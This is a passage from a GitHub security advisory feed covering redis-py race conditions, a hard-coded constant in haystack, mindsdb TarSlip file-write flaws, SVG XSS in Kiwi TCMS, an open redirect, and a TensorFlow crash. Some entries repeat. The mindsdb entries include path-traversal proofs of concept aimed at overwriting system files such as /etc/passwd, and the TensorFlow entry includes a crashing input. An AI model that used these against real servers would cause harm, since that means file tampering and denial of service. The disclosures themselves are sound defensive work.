]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-8fww-64cx-x8p5</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2023-03-26T21:30:23.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[redis] redis-py Race Condition due to incomplete fix]]></title>
        <id>https://github.com/advisories/GHSA-8fww-64cx-x8p5</id>
        <link href="https://github.com/advisories/GHSA-8fww-64cx-x8p5"/>
        <updated>2023-03-31T14:24:54.000Z</updated>
        <content type="html"><![CDATA[<p>redis-py through 4.5.3 and 4.4.3 leaves a connection open after canceling an async Redis command at an inopportune time (in the case of a non-pipeline operation), and can send response data to the client of an unrelated request. NOTE: this issue exists because of an incomplete fix for CVE-2023-28858.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-28859">https://nvd.nist.gov/vuln/detail/CVE-2023-28859</a></li>
<li><a href="https://github.com/redis/redis-py/issues/2665">https://github.com/redis/redis-py/issues/2665</a></li>
<li><a href="https://github.com/redis/redis-py/pull/2641">https://github.com/redis/redis-py/pull/2641</a></li>
<li><a href="https://github.com/redis/redis-py/pull/2666">https://github.com/redis/redis-py/pull/2666</a></li>
<li><a href="https://github.com/redis/redis-py/pull/2671">https://github.com/redis/redis-py/pull/2671</a></li>
<li><a href="https://github.com/redis/redis-py/releases/tag/v4.4.4">https://github.com/redis/redis-py/releases/tag/v4.4.4</a></li>
<li><a href="https://github.com/redis/redis-py/releases/tag/v4.5.4">https://github.com/redis/redis-py/releases/tag/v4.5.4</a></li>
<li><a href="https://github.com/advisories/GHSA-8fww-64cx-x8p5">https://github.com/advisories/GHSA-8fww-64cx-x8p5</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-8fww-64cx-x8p5</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2023-03-26T21:30:23.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[farm-haystack] Use of hard-coded, security-relevant constants in deepset-ai/haystack]]></title>
        <id>https://github.com/advisories/GHSA-w7qg-j435-78qw</id>
        <link href="https://github.com/advisories/GHSA-w7qg-j435-78qw"/>
        <updated>2023-03-30T22:55:53.000Z</updated>
        <content type="html"><![CDATA[<p>Use of Hard-coded, Security-relevant Constants in GitHub repository deepset-ai/haystack in version 1.15.0 and prior. A patch is available at commit 5fc84904f198de661d5b933fde756aa922bf09f1.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-1712">https://nvd.nist.gov/vuln/detail/CVE-2023-1712</a></li>
<li><a href="https://github.com/deepset-ai/haystack/commit/5fc84904f198de661d5b933fde756aa922bf09f1">https://github.com/deepset-ai/haystack/commit/5fc84904f198de661d5b933fde756aa922bf09f1</a></li>
<li><a href="https://huntr.dev/bounties/9a6b1fb4-ec9b-4cfa-af1e-9ce304924829">https://huntr.dev/bounties/9a6b1fb4-ec9b-4cfa-af1e-9ce304924829</a></li>
<li><a href="https://github.com/deepset-ai/haystack/pull/4535">https://github.com/deepset-ai/haystack/pull/4535</a></li>
<li><a href="https://github.com/advisories/GHSA-w7qg-j435-78qw">https://github.com/advisories/GHSA-w7qg-j435-78qw</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-w7qg-j435-78qw</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2023-03-30T12:30:15.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[mindsdb] mindsdb arbitrary file write when extracting a remotely retrieved Tarball]]></title>
        <id>https://github.com/advisories/GHSA-2g5w-29q9-w6hx</id>
        <link href="https://github.com/advisories/GHSA-2g5w-29q9-w6hx"/>
        <updated>2023-03-30T21:42:49.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>An unsafe extraction is being performed using <code>tarfile.extractall()</code> from a remotely retrieved tarball. Which may lead to the writing of the extracted files to an unintended location. Sometimes, the vulnerability is called a TarSlip or a ZipSlip variant.</p>
<h3 id="details">Details</h3>
<p>I commented the following snippet of code as a vulnerability details. The code is from <a href="https://github.com/mindsdb/mindsdb/blob/afedd37c16e579b6dc075b0814e42d0505ccdc07/mindsdb/api/http/namespaces/file.py#L26..L134">file.py#L26..L134</a></p>
<pre><code class="language-python">@ns_conf.route('/&lt;name&gt;')
@ns_conf.param('name', "MindsDB's name for file")
class File(Resource):
    @ns_conf.doc('put_file')
    def put(self, name: str):
        ''' add new file
            params in FormData:
                - file
                - original_file_name [optional]
        '''

        data = {}

        ... omitted for brevity

            url = data['source']
            data['file'] = data['name']

            ... omitted for brevity 

            with requests.get(url, stream=True) as r:                   # Source: retrieve the URL which point to a remotely located tarball 
                if r.status_code != 200:
                    return http_error(
                        400,
                        "Error getting file",
                        f"Got status code: {r.status_code}"
                    )
                file_path = os.path.join(temp_dir_path, data['file'])
                with open(file_path, 'wb') as f:
                    for chunk in r.iter_content(chunk_size=8192):   # write with chunks the remote retrieved file into file_path location 
                        f.write(chunk)

        original_file_name = data.get('original_file_name')

        file_path = os.path.join(temp_dir_path, data['file'])      
        lp = file_path.lower()
        if lp.endswith(('.zip', '.tar.gz')):
            if lp.endswith('.zip'):
                with zipfile.ZipFile(file_path) as f:
                    f.extractall(temp_dir_path)
            elif lp.endswith('.tar.gz'):
                with tarfile.open(file_path) as f:  # Just after 
                    f.extractall(temp_dir_path)  # Sink: the tarball located by file_path is supposed to be extracted to temp_dir_path. 
</code></pre>
<p>So, a remotely available tarball is being retrieved and written to the server filesystem in chunks, and then, if the extension ends with <code>.tar.gz</code> of a compressed tarball, the mindsdb app applies <code>tarfile.extractall()</code> directly with no checks for the destination. </p>
<p>However, according to the following <a href="https://docs.python.org/3/library/tarfile.html#tarfile.TarFile.extractall">warning</a> from the official documentation;</p>
<blockquote>
<p>Warning: Never extract archives from untrusted sources without prior inspection. It is possible that files are created outside of path, e.g. members that have absolute filenames starting with "/" or filenames with two dots "..". </p>
</blockquote>
<h3 id="poc">PoC</h3>
<p>The following PoC is provided for illustration purposes only. It showcases the risk of extracting a non-harmless text file <code>sim4n6.txt</code> to one of the parent locations rather than the intended current folder.</p>
<pre><code class="language-bash">&gt; tar --list -v -f archive.tar.gz
tar: Removing leading "../../../" from member names
../../../sim4n6.txt

&gt; python3 
Python 3.10.6 (main, Nov  2 2022, 18:53:38) [GCC 11.3.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
&gt;&gt;&gt; import tarfile
&gt;&gt;&gt; with tarfile.open("archive.tar.gz") as tf:
&gt;&gt;&gt;         tf.extractall()
&gt;&gt;&gt; exit()

&gt; test -f ../../../sim4n6.txt &amp;&amp; echo "sim4n6.txt exists"
sim4n6.txt exists
</code></pre>
<h3 id="attack-scenario">Attack Scenario</h3>
<p>An attacker could craft a malicious tarball with a filename path, such as ../../../../../../../../etc/passwd, and then serve the archive remotely, proceed to the PUT request of the tarball through mindsdb and overwrite the system files of the hosting server for instance.</p>
<h3 id="mitigation">Mitigation</h3>
<p>Potential mitigation could be to:</p>
<ul>
<li>Use a safer module, like <code>zipfile</code>.</li>
<li>Use an alternative of <code>tarfile</code>, such as <code>tarsafe</code>. </li>
<li>Validate the location or the absolute path of the extracted files and discard those with malicious paths such as relative path <code>../../..</code> or absolute path such as <code>/etc/password</code>. A simple wrapper could be written to raise an exception when a path traversal may be identified.</li>
</ul>
<p>This is similar to the other report <a href="https://github.com/mindsdb/mindsdb/security/advisories/GHSA-7x45-phmr-9wqp">GHSA-7x45-phmr-9wqp</a>.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/mindsdb/mindsdb/security/advisories/GHSA-2g5w-29q9-w6hx">https://github.com/mindsdb/mindsdb/security/advisories/GHSA-2g5w-29q9-w6hx</a></li>
<li><a href="https://github.com/mindsdb/mindsdb/blob/afedd37c16e579b6dc075b0814e42d0505ccdc07/mindsdb/api/http/namespaces/file.py#L26..L134">https://github.com/mindsdb/mindsdb/blob/afedd37c16e579b6dc075b0814e42d0505ccdc07/mindsdb/api/http/namespaces/file.py#L26..L134</a></li>
<li><a href="https://github.com/advisories/GHSA-2g5w-29q9-w6hx">https://github.com/advisories/GHSA-2g5w-29q9-w6hx</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-2g5w-29q9-w6hx</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2023-03-30T21:42:48.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[kiwitcms/Kiwi] Kiwi TCMS Stored Cross-site Scripting via SVG file]]></title>
        <id>https://github.com/advisories/GHSA-2wcr-87wf-cf9j</id>
        <link href="https://github.com/advisories/GHSA-2wcr-87wf-cf9j"/>
        <updated>2023-03-30T20:18:31.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>Kiwi TCMS accepts SVG files uploaded by users which could potentially contain JavaScript code. If SVG images are viewed directly, i.e. not rendered in an HTML page, this JavaScript code could execute. </p>
<h3 id="patches">Patches</h3>
<p>This vulnerability has been fixed by configuring Kiwi TCMS to serve with the Content-Security-Policy HTTP header which blocks inline JavaScript in all modern browsers.</p>
<h3 id="workarounds">Workarounds</h3>
<p>Configure Content-Security-Policy header, see <a href="https://github.com/kiwitcms/Kiwi/commit/6617cee0fb70cc394b7be6bbc86ef84e6e9de077">commit 6617cee0</a>.</p>
<h3 id="references">References</h3>
<p>You can visit <a href="https://digi.ninja/blog/svg_xss.php">https://digi.ninja/blog/svg_xss.php</a> for more technical details.</p>
<p>Independently disclosed by <a href="https://huntr.dev/bounties/bf99001b-a0a2-4f7d-98cd-983bc7f14a69/">Antonio Spataro</a> and <a href="https://huntr.dev/bounties/f8c73bcc-02f3-4c65-a92b-1caa4d67c2fd/">@1d8</a>.</p>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/kiwitcms/Kiwi/security/advisories/GHSA-2wcr-87wf-cf9j">https://github.com/kiwitcms/Kiwi/security/advisories/GHSA-2wcr-87wf-cf9j</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-27489">https://nvd.nist.gov/vuln/detail/CVE-2023-27489</a></li>
<li><a href="https://github.com/kiwitcms/Kiwi/commit/6617cee0fb70cc394b7be6bbc86ef84e6e9de077">https://github.com/kiwitcms/Kiwi/commit/6617cee0fb70cc394b7be6bbc86ef84e6e9de077</a></li>
<li><a href="https://github.com/advisories/GHSA-2wcr-87wf-cf9j">https://github.com/advisories/GHSA-2wcr-87wf-cf9j</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-2wcr-87wf-cf9j</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2023-03-30T20:18:29.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[mindsdb] Arbitrary file write in mindsdb when Extracting Tarballs retrieved from a remote location ]]></title>
        <id>https://github.com/advisories/GHSA-7x45-phmr-9wqp</id>
        <link href="https://github.com/advisories/GHSA-7x45-phmr-9wqp"/>
        <updated>2023-03-30T22:19:51.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>An unsafe extraction is being performed using <code>shutil.unpack_archive()</code> from a remotely retrieved tarball. Which may lead to the writing of the extracted files to an unintended location. This vulnerability is sometimes called a <strong>TarSlip</strong> or a <strong>ZipSlip variant</strong>.</p>
<h3 id="details">Details</h3>
<p>Unpacking files using the high-level function <code>shutil.unpack_archive()</code> from a potentially malicious tarball without validating that the destination file path remained within the intended destination directory may cause files to be overwritten outside the destination directory.</p>
<p>As can be seen in the vulnerable snippet code source, an archive is being retrieved using the <code>download_file()</code> function from a remote location which is a user-provided permanent storage bucket <code>s3</code>. Immediately after being retrieved, the tarball is unsafely unpacked using the function <code>shutil.unpack_archive()</code>.</p>
<p>The vulnerable code is <a href="https://github.com/mindsdb/mindsdb/blob/69c76e727b8067f32b06ab83bb835a8c416c4f21/mindsdb/interfaces/storage/fs.py#L128..L129">L128..L129</a> in <a href="https://github.com/mindsdb/mindsdb/blob/69c76e727b8067f32b06ab83bb835a8c416c4f21/mindsdb/interfaces/storage/fs.py">fs.py</a> file.</p>
<pre><code class="language-python3">    def __init__(self):
        super().__init__()
        if 's3_credentials' in self.config['permanent_storage']:
            self.s3 = boto3.client('s3', **self.config['permanent_storage']['s3_credentials'])
        else:
            self.s3 = boto3.client('s3')
       
        # User provided remote storage!
        self.bucket = self.config['permanent_storage']['bucket'] 

    def get(self, local_name, base_dir):
        remote_name = local_name
        remote_ziped_name = f'{remote_name}.tar.gz'
        local_ziped_name = f'{local_name}.tar.gz'
        local_ziped_path = os.path.join(base_dir, local_ziped_name)
        os.makedirs(base_dir, exist_ok=True)
        
        # Retrieve a potentially malicious tarball
        self.s3.download_file(self.bucket, remote_ziped_name, local_ziped_path)

        # Perform an unsafe extraction
        shutil.unpack_archive(local_ziped_path, base_dir)

        os.system(f'chmod -R 777 {base_dir}')
        os.remove(local_ziped_path)
</code></pre>
<h3 id="poc">PoC</h3>
<p>The following PoC is provided for illustration purposes only. It showcases the risk of extracting a non-harmless text file <code>sim4n6.txt</code> to one of the parent locations rather than the intended current folder.</p>
<pre><code class="language-bash">&gt; tar --list -f archive.tar
tar: Removing leading "../../../" from member names
../../../sim4n6.txt

&gt; python3 
Python 3.10.6 (main, Nov  2 2022, 18:53:38) [GCC 11.3.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
&gt;&gt;&gt; import shutil
&gt;&gt;&gt; shutil.unpack_archive("archive.tar")
&gt;&gt;&gt; exit()

&gt; test -f ../../../sim4n6.txt &amp;&amp; echo "sim4n6.txt exists"
sim4n6.txt exists
</code></pre>
<h3 id="attack-scenario">Attack Scenario</h3>
<p>An attacker could craft a malicious tarball with a filename path, such as <code>../../../../../../../../etc/passwd</code>, and then serve the archive remotely using a personal bucket <code>s3</code>, thus, retrieve the tarball through <strong>mindsdb</strong> and overwrite the system files of the hosting server. </p>
<h3 id="mitigation">Mitigation</h3>
<p>Potential mitigation could be to:</p>
<ul>
<li>Use a safer module, like <code>zipfile</code>.</li>
<li>Validate the location of the extracted files and discard those with malicious paths such as relative path <code>..</code> or absolute path such as <code>/etc/password</code>.</li>
<li>Perform a checksum verification for the retrieved archive, but hard-coding the hashes may be cumbersome and difficult to manage.</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/mindsdb/mindsdb/security/advisories/GHSA-7x45-phmr-9wqp">https://github.com/mindsdb/mindsdb/security/advisories/GHSA-7x45-phmr-9wqp</a></li>
<li><a href="https://github.com/mindsdb/mindsdb/blob/69c76e727b8067f32b06ab83bb835a8c416c4f21/mindsdb/interfaces/storage/fs.py">https://github.com/mindsdb/mindsdb/blob/69c76e727b8067f32b06ab83bb835a8c416c4f21/mindsdb/interfaces/storage/fs.py</a></li>
<li><a href="https://github.com/mindsdb/mindsdb/blob/69c76e727b8067f32b06ab83bb835a8c416c4f21/mindsdb/interfaces/storage/fs.py#L128..L129">https://github.com/mindsdb/mindsdb/blob/69c76e727b8067f32b06ab83bb835a8c416c4f21/mindsdb/interfaces/storage/fs.py#L128..L129</a></li>
<li><a href="https://github.com/mindsdb/mindsdb/releases/tag/v22.11.4.3">https://github.com/mindsdb/mindsdb/releases/tag/v22.11.4.3</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2022-23522">https://nvd.nist.gov/vuln/detail/CVE-2022-23522</a></li>
<li><a href="https://github.com/advisories/GHSA-7x45-phmr-9wqp">https://github.com/advisories/GHSA-7x45-phmr-9wqp</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-7x45-phmr-9wqp</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2023-03-30T20:16:33.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[django-termsandconditions] Terms and Conditions Module vulnerable to Open Redirect]]></title>
        <id>https://github.com/advisories/GHSA-6rmf-cv6p-4h27</id>
        <link href="https://github.com/advisories/GHSA-6rmf-cv6p-4h27"/>
        <updated>2023-03-27T22:23:35.000Z</updated>
        <content type="html"><![CDATA[<p>A vulnerability has been found in cyface Terms and Conditions Module up to 2.0.10 and classified as problematic. Affected by this vulnerability is the function returnTo of the file termsandconditions/views.py. The manipulation leads to open redirect. The attack can be launched remotely. Upgrading to version 2.0.11 can address this issue. The name of the patch is 03396a1c2e0af95e12a45c5faef7e47a4b513e1a. It is recommended to upgrade the affected component. The associated identifier of this vulnerability is VDB-216175.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2022-4589">https://nvd.nist.gov/vuln/detail/CVE-2022-4589</a></li>
<li><a href="https://github.com/cyface/django-termsandconditions/pull/239">https://github.com/cyface/django-termsandconditions/pull/239</a></li>
<li><a href="https://github.com/cyface/django-termsandconditions/commit/03396a1c2e0af95e12a45c5faef7e47a4b513e1a">https://github.com/cyface/django-termsandconditions/commit/03396a1c2e0af95e12a45c5faef7e47a4b513e1a</a></li>
<li><a href="https://github.com/cyface/django-termsandconditions/releases/tag/v2.0.11">https://github.com/cyface/django-termsandconditions/releases/tag/v2.0.11</a></li>
<li><a href="https://vuldb.com/?id.216175">https://vuldb.com/?id.216175</a></li>
<li><a href="https://github.com/cyface/django-termsandconditions/releases/tag/v2.0.10">https://github.com/cyface/django-termsandconditions/releases/tag/v2.0.10</a></li>
<li><a href="https://github.com/advisories/GHSA-6rmf-cv6p-4h27">https://github.com/advisories/GHSA-6rmf-cv6p-4h27</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-6rmf-cv6p-4h27</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2022-12-17T15:30:23.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[redis] redis-py Race Condition vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-24wv-mv5m-xv4h</id>
        <link href="https://github.com/advisories/GHSA-24wv-mv5m-xv4h"/>
        <updated>2023-03-31T16:07:40.000Z</updated>
        <content type="html"><![CDATA[<p>redis-py before 4.5.3, as used in ChatGPT and other products, leaves a connection open after canceling an async Redis command at an inopportune time (in the case of a pipeline operation), and can send response data to the client of an unrelated request in an off-by-one manner. The fixed versions for this CVE Record are 4.3.6, 4.4.3, and 4.5.3, but <a href="https://github.com/redis/redis-py/issues/2665">are believed to be incomplete</a>. CVE-2023-28859 has been assigned the issues caused by the incomplete fixes.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-28858">https://nvd.nist.gov/vuln/detail/CVE-2023-28858</a></li>
<li><a href="https://github.com/redis/redis-py/issues/2624">https://github.com/redis/redis-py/issues/2624</a></li>
<li><a href="https://github.com/redis/redis-py/pull/2641">https://github.com/redis/redis-py/pull/2641</a></li>
<li><a href="https://github.com/redis/redis-py/compare/v4.3.5...v4.3.6">https://github.com/redis/redis-py/compare/v4.3.5...v4.3.6</a></li>
<li><a href="https://github.com/redis/redis-py/compare/v4.4.2...v4.4.3">https://github.com/redis/redis-py/compare/v4.4.2...v4.4.3</a></li>
<li><a href="https://github.com/redis/redis-py/compare/v4.5.2...v4.5.3">https://github.com/redis/redis-py/compare/v4.5.2...v4.5.3</a></li>
<li><a href="https://openai.com/blog/march-20-chatgpt-outage">https://openai.com/blog/march-20-chatgpt-outage</a></li>
<li><a href="https://github.com/redis/redis-py/releases/tag/v4.4.4">https://github.com/redis/redis-py/releases/tag/v4.4.4</a></li>
<li><a href="https://github.com/redis/redis-py/releases/tag/v4.5.4">https://github.com/redis/redis-py/releases/tag/v4.5.4</a></li>
<li><a href="https://github.com/advisories/GHSA-24wv-mv5m-xv4h">https://github.com/advisories/GHSA-24wv-mv5m-xv4h</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-24wv-mv5m-xv4h</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2023-03-26T21:30:23.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[redis] redis-py Race Condition vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-24wv-mv5m-xv4h</id>
        <link href="https://github.com/advisories/GHSA-24wv-mv5m-xv4h"/>
        <updated>2023-03-31T16:07:40.000Z</updated>
        <content type="html"><![CDATA[<p>redis-py before 4.5.3, as used in ChatGPT and other products, leaves a connection open after canceling an async Redis command at an inopportune time (in the case of a pipeline operation), and can send response data to the client of an unrelated request in an off-by-one manner. The fixed versions for this CVE Record are 4.3.6, 4.4.3, and 4.5.3, but <a href="https://github.com/redis/redis-py/issues/2665">are believed to be incomplete</a>. CVE-2023-28859 has been assigned the issues caused by the incomplete fixes.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-28858">https://nvd.nist.gov/vuln/detail/CVE-2023-28858</a></li>
<li><a href="https://github.com/redis/redis-py/issues/2624">https://github.com/redis/redis-py/issues/2624</a></li>
<li><a href="https://github.com/redis/redis-py/pull/2641">https://github.com/redis/redis-py/pull/2641</a></li>
<li><a href="https://github.com/redis/redis-py/compare/v4.3.5...v4.3.6">https://github.com/redis/redis-py/compare/v4.3.5...v4.3.6</a></li>
<li><a href="https://github.com/redis/redis-py/compare/v4.4.2...v4.4.3">https://github.com/redis/redis-py/compare/v4.4.2...v4.4.3</a></li>
<li><a href="https://github.com/redis/redis-py/compare/v4.5.2...v4.5.3">https://github.com/redis/redis-py/compare/v4.5.2...v4.5.3</a></li>
<li><a href="https://openai.com/blog/march-20-chatgpt-outage">https://openai.com/blog/march-20-chatgpt-outage</a></li>
<li><a href="https://github.com/redis/redis-py/releases/tag/v4.4.4">https://github.com/redis/redis-py/releases/tag/v4.4.4</a></li>
<li><a href="https://github.com/redis/redis-py/releases/tag/v4.5.4">https://github.com/redis/redis-py/releases/tag/v4.5.4</a></li>
<li><a href="https://github.com/advisories/GHSA-24wv-mv5m-xv4h">https://github.com/advisories/GHSA-24wv-mv5m-xv4h</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-24wv-mv5m-xv4h</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2023-03-26T21:30:23.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[redis] redis-py Race Condition vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-24wv-mv5m-xv4h</id>
        <link href="https://github.com/advisories/GHSA-24wv-mv5m-xv4h"/>
        <updated>2023-03-31T16:07:40.000Z</updated>
        <content type="html"><![CDATA[<p>redis-py before 4.5.3, as used in ChatGPT and other products, leaves a connection open after canceling an async Redis command at an inopportune time (in the case of a pipeline operation), and can send response data to the client of an unrelated request in an off-by-one manner. The fixed versions for this CVE Record are 4.3.6, 4.4.3, and 4.5.3, but <a href="https://github.com/redis/redis-py/issues/2665">are believed to be incomplete</a>. CVE-2023-28859 has been assigned the issues caused by the incomplete fixes.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-28858">https://nvd.nist.gov/vuln/detail/CVE-2023-28858</a></li>
<li><a href="https://github.com/redis/redis-py/issues/2624">https://github.com/redis/redis-py/issues/2624</a></li>
<li><a href="https://github.com/redis/redis-py/pull/2641">https://github.com/redis/redis-py/pull/2641</a></li>
<li><a href="https://github.com/redis/redis-py/compare/v4.3.5...v4.3.6">https://github.com/redis/redis-py/compare/v4.3.5...v4.3.6</a></li>
<li><a href="https://github.com/redis/redis-py/compare/v4.4.2...v4.4.3">https://github.com/redis/redis-py/compare/v4.4.2...v4.4.3</a></li>
<li><a href="https://github.com/redis/redis-py/compare/v4.5.2...v4.5.3">https://github.com/redis/redis-py/compare/v4.5.2...v4.5.3</a></li>
<li><a href="https://openai.com/blog/march-20-chatgpt-outage">https://openai.com/blog/march-20-chatgpt-outage</a></li>
<li><a href="https://github.com/redis/redis-py/releases/tag/v4.4.4">https://github.com/redis/redis-py/releases/tag/v4.4.4</a></li>
<li><a href="https://github.com/redis/redis-py/releases/tag/v4.5.4">https://github.com/redis/redis-py/releases/tag/v4.5.4</a></li>
<li><a href="https://github.com/advisories/GHSA-24wv-mv5m-xv4h">https://github.com/advisories/GHSA-24wv-mv5m-xv4h</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-24wv-mv5m-xv4h</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2023-03-26T21:30:23.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[tensorflow-cpu] TensorFlow Denial of Service vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-fxgc-95xx-grvq</id>
        <link href="https://github.com/advisories/GHSA-fxgc-95xx-grvq"/>
        <updated>2023-04-04T15:37:25.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>A malicious invalid input crashes a tensorflow model (Check Failed) and can be used to trigger a denial of service attack.
A proof of concept can be constructed with the <code>Convolution3DTranspose</code> function, which works well with expected inputs and can be deployed in real-world systems. However, if the model is called with a malicious input which has a zero dimension, it gives Check Failed failure and crashes.</p>
<pre><code class="language-python">import tensorflow as tf

class MyModel(tf.keras.Model):
    def __init__(self):
        super().__init__()
        self.conv = tf.keras.layers.Convolution3DTranspose(2, [3,3,3], padding="same")
        
    def call(self, input):
        return self.conv(input)
model = MyModel() # Defines a valid model.

x = tf.random.uniform([1, 32, 32, 32, 3], minval=0, maxval=0, dtype=tf.float32) # This is a valid input.
output = model.predict(x)
print(output.shape) # (1, 32, 32, 32, 2)

x = tf.random.uniform([1, 32, 32, 0, 3], dtype=tf.float32) # This is an invalid input.
output = model(x) # crash
</code></pre>
<p>This Convolution3DTranspose layer is a very common API in modern neural networks. The ML models containing such vulnerable components could be deployed in ML applications or as cloud services. This failure could be potentially used to trigger a denial of service attack on ML cloud services.</p>
<h3 id="patches">Patches</h3>
<p>This has been patched the issue in</p>
<ul>
<li>GitHub commit <a href="https://github.com/tensorflow/tensorflow/commit/948fe6369a5711d4b4568ea9bbf6015c6dfb77e2">948fe6369a5711d4b4568ea9bbf6015c6dfb77e2</a></li>
<li>GitHub commit <a href="https://github.com/keras-team/keras/commit/85db5d07db54b853484bfd358c3894d948c36baf">85db5d07db54b853484bfd358c3894d948c36baf</a>.</li>
</ul>
<p>The fix will be included in TensorFlow 2.12.0. This commit will also be cherrypicked into TensorFlow 2.11.1.</p>
<h3 id="for-more-information">For more information</h3>
<p>Please consult <a href="https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md">Tensor Flow's security guide</a> for more information regarding the security model and how to contact them with issues and questions.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/tensorflow/tensorflow/security/advisories/GHSA-fxgc-95xx-grvq">https://github.com/tensorflow/tensorflow/security/advisories/GHSA-fxgc-95xx-grvq</a></li>
<li><a href="https://github.com/keras-team/keras/commit/85db5d07db54b853484bfd358c3894d948c36baf">https://github.com/keras-team/keras/commit/85db5d07db54b853484bfd358c3894d948c36baf</a></li>
<li><a href="https://github.com/tensorflow/tensorflow/commit/948fe6369a5711d4b4568ea9bbf6015c6dfb77e2">https://github.com/tensorflow/tensorflow/commit/948fe6369a5711d4b4568ea9bbf6015c6dfb77e2</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-25661">https://nvd.nist.gov/vuln/detail/CVE-2023-25661</a></li>
<li><a href="https://github.com/advisories/GHSA-fxgc-95xx-grvq">https://github.com/advisories/GHSA-fxgc-95xx-grvq</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-fxgc-95xx-grvq</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2023-03-27T21:05:10.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[tensorflow] TensorFlow Denial of Service vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-fxgc-95xx-grvq</id>
        <link href="https://github.com/advisories/GHSA-fxgc-95xx-grvq"/>
        <updated>2023-04-04T15:37:25.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>A malicious invalid input crashes a tensorflow model (Check Failed) and can be used to trigger a denial of service attack.
A proof of concept can be constructed with the <code>Convolution3DTranspose</code> function, which works well with expected inputs and can be deployed in real-world systems. However, if the model is called with a malicious input which has a zero dimension, it gives Check Failed failure and crashes.</p>
<pre><code class="language-python">import tensorflow as tf

class MyModel(tf.keras.Model):
    def __init__(self):
        super().__init__()
        self.conv = tf.keras.layers.Convolution3DTranspose(2, [3,3,3], padding="same")
        
    def call(self, input):
        return self.conv(input)
model = MyModel() # Defines a valid model.

x = tf.random.uniform([1, 32, 32, 32, 3], minval=0, maxval=0, dtype=tf.float32) # This is a valid input.
output = model.predict(x)
print(output.shape) # (1, 32, 32, 32, 2)

x = tf.random.uniform([1, 32, 32, 0, 3], dtype=tf.float32) # This is an invalid input.
output = model(x) # crash
</code></pre>
